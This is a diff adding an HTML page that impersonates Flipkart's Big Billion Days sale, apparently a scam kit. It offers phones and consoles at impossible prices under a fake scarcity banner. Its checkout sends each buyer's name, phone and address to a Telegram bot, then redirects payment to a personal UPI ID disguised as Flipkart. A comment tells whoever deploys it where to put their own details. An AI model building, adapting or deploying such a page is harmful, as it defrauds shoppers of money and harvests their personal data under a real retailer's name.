@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Flipkart | Big Billion Days 2026</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        body { font-family: 'Roboto', sans-serif; background-color: #f1f3f6; margin: 0; user-select: none; }
+        .fk-blue { background-color: #2874f0; }
+        .btn-buy { background: #fb641b; color: #fff; }
+        .product-card { background: #fff; border: 0.5px solid #f0f0f0; }
+        .line-clamp { display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+        .img-slider { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; scrollbar-width: none; scroll-behavior: smooth; }
+        .img-slider::-webkit-scrollbar { display: none; }
+        .img-slider img { min-width: 100%; height: 350px; object-fit: contain; scroll-snap-align: start; background: white; }
+        input, textarea { border: 1px solid #dbdbdb; padding: 12px; width: 100%; border-radius: 2px; outline: none; margin-bottom: 10px; }
+        .step-box { background: #fff; margin-bottom: 8px; padding: 15px; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .animate-pulse-fast { animation: pulse 1s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
+    </style>
+</head>
+<body class="pb-16">
+
+    <header class="fk-blue p-3 sticky top-0 z-[100] text-white flex justify-between items-center shadow-md">
+        <div class="flex items-center space-x-3">
+            <i class="fa-solid fa-bars text-lg"></i>
+            <div class="flex flex-col">
+                <span class="font-bold italic text-xl leading-none">Flipkart</span>
+                <span class="text-[10px] italic">Plus <span class="text-yellow-400">✦</span></span>
+            </div>
+        </div>
+        <div class="flex space-x-5 text-lg">
+            <i class="fa-solid fa-magnifying-glass"></i>
+            <i class="fa-solid fa-cart-shopping"></i>
+            <button onclick="openAdmin()" class="bg-white text-[#2874f0] text-[10px] px-2 py-0.5 font-bold rounded-sm uppercase">Admin</button>
+        </div>
+    </header>
+
+    <div id="storeFront" class="grid grid-cols-2"></div>
+
+    <div id="detailPage" class="hidden fixed inset-0 bg-white z-[200] overflow-y-auto pb-20">
+        <nav class="p-3 border-b flex items-center sticky top-0 bg-white z-[210]">
+            <i class="fa-solid fa-arrow-left text-xl mr-5" onclick="closeDetail()"></i>
+            <span class="font-medium truncate" id="navTitle">Product Details</span>
+        </nav>
+        <div id="detailBody"></div>
+        <div class="fixed bottom-0 w-full h-14 flex z-[220] shadow-2xl">
+            <button class="flex-1 bg-white text-black font-bold uppercase text-sm border-t">Add to Cart</button>
+            <button onclick="openCheckout()" class="flex-1 btn-buy text-white font-bold uppercase text-sm">Buy Now</button>
+        </div>
+    </div>
+
+    <div id="checkoutPage" class="hidden fixed inset-0 bg-[#f1f3f6] z-[300] overflow-y-auto">
+        <nav class="fk-blue p-3 text-white flex items-center">
+            <i class="fa-solid fa-arrow-left text-xl mr-5" onclick="closeCheckout()"></i>
+            <span class="font-medium">Order Summary</span>
+        </nav>
+        <div class="step-box flex items-center text-gray-500 text-xs font-bold uppercase mt-2">
+            <span class="bg-gray-100 px-2 py-1 mr-2 text-blue-600">1</span> Delivery Details
+        </div>
+        <div class="bg-white px-4 pb-4">
+            <input type="text" id="custName" placeholder="Full Name">
+            <input type="number" id="custPhone" placeholder="Mobile Number">
+            <textarea id="custAddr" placeholder="Full Address (House No, Area, Pincode)" rows="2"></textarea>
+        </div>
+        <div class="p-3 fixed bottom-0 w-full bg-white border-t flex justify-between items-center">
+            <div class="text-lg font-bold" id="finalAmt">₹0</div>
+            <button onclick="processOrder()" class="btn-buy px-10 py-3 font-bold uppercase rounded-sm">Confirm Order</button>
+        </div>
+    </div>
+
+    <div id="adminPanel" class="hidden fixed inset-0 bg-white z-[500] p-5 overflow-y-auto">
+        <h2 class="text-xl font-bold border-b pb-3 mb-4 flex justify-between">Admin <span onclick="closeAdmin()" class="text-gray-400">&times;</span></h2>
+        <input type="password" id="adminKey" placeholder="Key (947228)">
+        <input type="text" id="pName" placeholder="Product Title">
+        <input type="number" id="pPrice" placeholder="Sale Price">
+        <input type="number" id="pMRP" placeholder="MRP">
+        <textarea id="pImgs" placeholder="Image URLs (comma separated)" rows="3"></textarea>
+        <textarea id="pDesc" placeholder="Features..." rows="2"></textarea>
+        <button onclick="addNewProduct()" class="w-full fk-blue text-white py-4 font-bold rounded uppercase">Update Store</button>
+    </div>
+
+    <script>
+        const SECRET = "947228";
+        const UPI_ID = "8709615634-w350@ybl";
+        
+        // --- ⚠️ APNI DETAILS YAHAN BHAREIN ⚠️ ---
+        const BOT_TOKEN = "http://t.me/My_9472_oder_bot"; 
+        const CHAT_ID = "1981500395";
+        // ----------------------------------------
+
+        let products = JSON.parse(localStorage.getItem('fk_v200_data')) || [];
+        
+        function generateData() {
+            const items = [
+                { name: "iPhone 16 Pro Max (Desert Titanium)", price: 1440, mrp: 159900, imgs: "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg?q=70,https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/4/b/-original-imahggex8m6jhazj.jpeg?q=70" },
+                { name: "Samsung Galaxy S24 Ultra 5G", price: 1299, mrp: 134999, imgs: "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg?q=70" },
+                { name: "Sony PS5 Console (Slim) 1TB", price: 499, mrp: 54990, imgs: "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/i/v/n/-original-imahy989zrg3crv9.jpeg?q=70" },
+                { name: "Apple Watch Series 10 GPS", price: 440, mrp: 41900, imgs: "https://rukminim2.flixcart.com/image/312/312/xif0q/smartwatch/y/v/k/-original-imah4ayf36unshmg.jpeg?q=70" }
+            ];
+            let list = [];
+            for(let i=0; i<40; i++) { list.push({...items[i % items.length], desc: "Big Billion Sale Special Offer. Free Shipping."}); }
+            return list;
+        }
+
+        function init() { if(products.length === 0) products = generateData(); render(); }
+
+        function render() {
+            document.getElementById('storeFront').innerHTML = products.map((p, i) => `
+                <div class="product-card" onclick="showDetail(${i})">
+                    <div class="h-44 p-4 flex items-center justify-center"><img src="${p.imgs.split(',')[0]}" class="max-h-full"></div>
+                    <div class="p-3">
+                        <h3 class="text-sm line-clamp">${p.name}</h3>
+                        <div class="flex items-center space-x-2 mt-1"><span class="font-bold">₹${Number(p.price).toLocaleString('en-IN')}</span></div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function showDetail(i) {
+            activeP = products[i];
+            const imgList = activeP.imgs.split(',');
+            document.getElementById('navTitle').innerText = activeP.name;
+            document.getElementById('detailBody').innerHTML = `
+                <div class="relative bg-white border-b"><div class="img-slider">${imgList.map(img => `<img src="${img.trim()}">`).join('')}</div></div>
+                <div class="p-4 bg-white">
+                    <h1 class="text-lg">${activeP.name}</h1>
+                    <div class="flex items-center space-x-3 mt-2"><span class="text-2xl font-bold">₹${activeP.price}</span><span class="text-gray-400 line-through italic">₹${activeP.mrp}</span></div>
+                    <div class="mt-4 bg-red-50 p-3 border border-red-100 rounded text-red-600 font-bold animate-pulse-fast text-xs">🔥 ONLY 2 LEFT IN STOCK!</div>
+                </div>
+            `;
+            document.getElementById('detailPage').classList.remove('hidden');
+        }
+
+        async function processOrder() {
+            const name = document.getElementById('custName').value;
+            const phone = document.getElementById('custPhone').value;
+            const addr = document.getElementById('custAddr').value;
+            if(!name || !phone || !addr) return alert("Details bhariye!");
+
+            const msg = `🚀 *New Order!*\n👤 *Name:* ${name}\n📞 *Phone:* ${phone}\n🏠 *Address:* ${addr}\n🛍️ *Product:* ${activeP.name}\n💰 *Price:* ₹${activeP.price}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                });
+            } catch (e) {}
+
+            window.location.href = `upi://pay?pa=${UPI_ID}&pn=Flipkart&am=${activeP.price}&cu=INR&tn=Order_Payment`;
+        }
+
+        function openAdmin() { document.getElementById('adminPanel').classList.remove('hidden'); }
+        function closeAdmin() { document.getElementById('adminPanel').classList.add('hidden'); }
+        function closeDetail() { document.getElementById('detailPage').classList.add('hidden'); }
+        function closeCheckout() { document.getElementById('checkoutPage').classList.add('hidden'); }
+        function openCheckout() { 
+            document.getElementById('finalAmt').innerText = "₹" + Number(activeP.price).toLocaleString('en-IN');
+            document.getElementById('checkoutPage').classList.remove('hidden'); 
+        }
+
+        function addNewProduct() {
+            if(document.getElementById('adminKey').value !== SECRET) return alert("Wrong Key!");
+            products.unshift({
+                name: document.getElementById('pName').value,
+                price: document.getElementById('pPrice').value,
+                mrp: document.getElementById('pMRP').value,
+                imgs: document.getElementById('pImgs').value,
+                desc: document.getElementById('pDesc').value
+            });
+            localStorage.setItem('fk_v200_data', JSON.stringify(products));
+            location.reload();
+        }
+
+        init();
+    </script>
+</body>
+</html>
